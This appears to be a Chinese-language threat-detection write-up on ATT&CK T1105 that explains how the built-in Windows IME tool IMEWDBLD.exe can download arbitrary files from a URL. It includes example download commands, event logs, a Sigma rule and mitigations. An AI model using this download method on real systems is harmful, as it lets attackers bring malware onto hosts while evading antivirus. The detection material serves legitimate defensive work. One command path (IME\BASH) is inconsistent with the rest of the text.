# T1105-Win-入口工具转移-IMEWDBLD.exe(白名单)

## 描述

攻击者可能通过命令和控制通道从外部系统将工具或其他文件转移到被攻击的环境中，以将恶意工具或有效载荷引入目标网络。文件传输可通过专用工具（如FTP）或替代协议（如scp、rsync、sftp）实现，适用于Windows、Mac和Linux系统。攻击者常利用系统内置的白名单工具（如`IMEWDBLD.exe`）来规避传统防病毒检测。

## 测试案例

`IMEWDBLD.exe`是微软拼音输入法的开放扩展字典模块，位于`C:\Windows\System32\IME\SHARED\IMEWDBLD.exe`，主要用于下载字典文件。攻击者可通过指定远程URL，下载任意文件到隐藏路径`C:\Users\%username%\AppData\Local\Microsoft\Windows\INetCache\IE\[随机值]`。

### 路径
```yml
- C:\Windows\System32\IME\SHARED\IMEWDBLD.exe
```

### 示例命令
从远程服务器下载文件：
```yml
C:\Windows\System32\IME\SHARED\IMEWDBLD.exe https://pastebin.com/raw/tdyShwLw
```

### 用例
- 从互联网下载任意文件（如恶意可执行文件）。
- 所需权限：用户权限。
- 操作系统：Windows 10。

### 查找下载文件路径
```yml
forfiles /P "%localappdata%\Microsoft\Windows\INetCache" /S /M * /C "cmd /c echo @path"
```
> **参数说明**  
> /P：指定搜索的起始路径，默认当前工作目录 (.)。  
> /S：递归搜索子目录，类似“DIR /S”。  
> /M：按搜索掩码查找文件，默认掩码为 '*'。  
> /C：为每个文件执行的命令，需用双引号括起来。  
> @path：返回文件的完整路径。

## 检测日志

### Windows安全日志
- **事件ID 4688**：记录`IMEWDBLD.exe`进程创建及命令行参数（需启用命令行审核）。

### Sysmon日志
- **事件ID 1**：捕获`IMEWDBLD.exe`进程创建及命令行参数。
- **事件ID 3**：记录`IMEWDBLD.exe`发起的HTTP/HTTPS网络连接（目标IP/端口）。
- **事件ID 11**：记录下载文件创建事件（如`C:\Users\%username%\AppData\Local\Microsoft\Windows\INetCache\IE\[随机值]\`）。

### 网络日志
- 捕获`IMEWDBLD.exe`发起的HTTP/HTTPS请求，检查目标URL是否异常。

## 测试复现

### 环境准备
- **靶机**：Windows 10。
- **权限**：用户权限（无需管理员）。
- **工具**：
  - `IMEWDBLD.exe`（系统自带，路径`C:\Windows\System32\IME\SHARED\IMEWDBLD.exe`）。
  - Sysmon（用于进程和文件监控）。
  - Wireshark（用于网络流量捕获）。
  - 测试Web服务器（提供可控URL）。
- **网络**：允许HTTP/HTTPS出站流量，建议在隔离网络中测试。
- **日志**：启用Windows安全日志和Sysmon日志。

### 攻击步骤
1. **执行下载命令**：
   ```bash
   C:\Users\liyang>C:\Windows\System32\IME\BASH\IMEWDBLD.exe https://dldir1.qq.com/qqfile/qq/PCQQ9.5.9/QQ9.5.9.28650.exe
   ```
   - 命令从指定URL下载文件，保存至`C:\Users\%username%\AppData\Local\Microsoft\Windows\INetCache\IE\[随机值]\`。
   - **注意**：Windows可能弹窗提示失败，忽略即可，文件已下载成功。
2. **验证下载文件**：
   ```bash
   C:\Users\liyang>forfiles /P "%localappdata%\Microsoft\Windows\INetCache" /S /M * /C "cmd /c echo @path"
   "C:\Users\liyang\AppData\Local\Microsoft\Windows\INetCache\Content.IE5"
   "C:\Users\liyang\AppData\Local\Microsoft\Windows\INetCache\IE"
   "C:\Users\liyang\AppData\Local\Microsoft\Windows\INetCache\Low"
   "C:\Users\liyang\AppData\Local\Microsoft\Windows\INetCache\Virtualized"
   "C:\Users\liyang\AppData\Local\Microsoft\Windows\INetCache\IE\container.dat"
   "C:\Users\liyang\AppData\Local\Microsoft\Windows\INetCache\IE\EG7SF236"
   "C:\Users\liyang\AppData\Local\Microsoft\Windows\INetCache\IE\JKCC1BIU"
   "C:\Users\liyang\AppData\Local\Microsoft\Windows\INetCache\IE\EG7SF236\DisabledFlights[1].cache"
   "C:\Users\liyang\AppData\Local\Microsoft\Windows\INetCache\IE\EG7SF236\dyntelconfig[2].cache"
   "C:\Users\liyang\AppData\Local\Microsoft\Windows\INetCache\IE\EG7SF236\RemoteSettings_Installer[1].cache"
   "C:\Users\liyang\AppData\Local\Microsoft\Windows\INetCache\IE\EG7SF236\ShippedFlights[1].cache"
   "C:\Users\liyang\AppData\Local\Microsoft\Windows\INetCache\IE\EG7SF236\tdyShwLw[1].txt"
   "C:\Users\liyang\AppData\Local\Microsoft\Windows\INetCache\IE\EG7SF236\views[1]"
   "C:\Users\liyang\AppData\Local\Microsoft\Windows\INetCache\IE\EG7SF236\windows-app-web-link[1].json"
   "C:\Users\liyang\AppData\Local\Microsoft\Windows\INetCache\IE\JKCC1BIU\QQ9.5.9.28650[1].exe"
   ```
3. **清理**：
   - 删除下载文件（如`del C:\Users\liyang\AppData\Local\Microsoft\Windows\INetCache\IE\JKCC1BIU\QQ9.5.9.28650[1].exe`）。

## 测试留痕
以下为Windows安全日志示例（事件ID 4688）：
```yml
已创建新进程。

创建者主题:
安全 ID: DESKTOP-PT656L6\liyang
帐户名: liyang
帐户域: DESKTOP-PT656L6
登录 ID: 0x47126

进程信息:
新进程 ID: 0x2278
新进程名称: C:\Windows\System32\IME\SHARED\IMEWDBLD.EXE
令牌提升类型: %%1938
强制性标签: Mandatory Label\Medium Mandatory Level
创建者进程 ID: 0x1ca8
创建者进程名称: C:\Windows\System32\cmd.exe
进程命令行: C:\Windows\System32\IME\SHARED\IMEWDBLD.exe https://dldir1.qq.com/qqfile/qq/PCQQ9.5.9/QQ9.5.9.28650.exe
```

## 检测方法/思路

### Sigma规则
基于Sigma规则，检测`IMEWDBLD.exe`的异常下载行为：

```yml
title: IMEWDBLD.exe Suspicious Invocation
id: b9e4c7f2-1a3b-4e5f-9c8d-3e2f5a6b7c9d
status: experimental
description: Detects suspicious execution of IMEWDBLD.exe, which can be used to download files from a remote URL
author: 12306Br0
date: 2022/04/20
references:
- https://lolbas-project.github.io/lolbas/Binaries/IMEWDBLD/
- https://cloud.tencent.com/developer/article/1848645
logsource:
  product: windows
  category: process_creation
detection:
  selection:
    Image|endswith: '\IMEWDBLD.exe'
    CommandLine|contains: 'http'
  condition: selection
falsepositives:
- Legitimate dictionary file downloads by Microsoft Pinyin IME
level: medium
```

### 检测思路
1. **进程监控**：
   - 检查`IMEWDBLD.exe`的命令行参数是否包含HTTP/HTTPS URL。
   - 监控异常父进程（如`cmd.exe`、`powershell.exe`）。
2. **文件监控**：
   - 检测文件创建事件，重点关注`C:\Users\%username%\AppData\Local\Microsoft\Windows\INetCache\IE\[随机值]\`路径下的非字典文件（如`.exe`）。
3. **网络监控**：
   - 捕获`IMEWDBLD.exe`发起的HTTP/HTTPS请求，检查目标URL是否为非微软官方服务器。
4. **行为监控**：
   - 检测`IMEWDBLD.exe`是否在非输入法更新场景下运行。
5. **关联分析**：
   - 结合Sysmon事件ID 1（进程创建）、3（网络连接）和11（文件创建）进行关联，识别完整攻击链。

### 检测建议
- **告警规则**：基于Sigma规则，配置SIEM系统（如Splunk、Elastic）检测`IMEWDBLD.exe`的异常命令行参数和文件创建。
- **基线对比**：建立`IMEWDBLD.exe`的正常使用基线（如下载微软官方字典文件），排除合法行为。
- **网络白名单**：限制`IMEWDBLD.exe`的出站流量，仅允许访问微软官方服务器。
- **文件完整性监控**：监控`INetCache\IE`目录下的文件，检测异常文件类型。

## 缓解措施
1. **限制网络访问**：
   - 配置防火墙，限制`IMEWDBLD.exe`的出站HTTP/HTTPS流量，仅允许访问微软官方服务器。
2. **加强日志监控**：
   - 启用命令行参数记录和Sysmon日志，覆盖进程、网络和文件操作。
3. **白名单管理**：
   - 使用应用白名单工具（如AppLocker）限制`IMEWDBLD.exe`的执行场景。
4. **权限管理**：
   - 限制普通用户运行`IMEWDBLD.exe`，仅允许输入法相关进程调用。
5. **定期审查**：
   - 检查`IMEWDBLD.exe`的异常使用记录，结合威胁情报分析潜在风险。

## 参考推荐
- MITRE ATT&CK T1105  
  https://attack.mitre.org/techniques/T1105  
- IMEWDBLD.exe  
  https://lolbas-project.github.io/lolbas/Binaries/IMEWDBLD/  
- IMEWDBLD.exe ByPass360 下载文件  
  https://cloud.tencent.com/developer/article/1848645
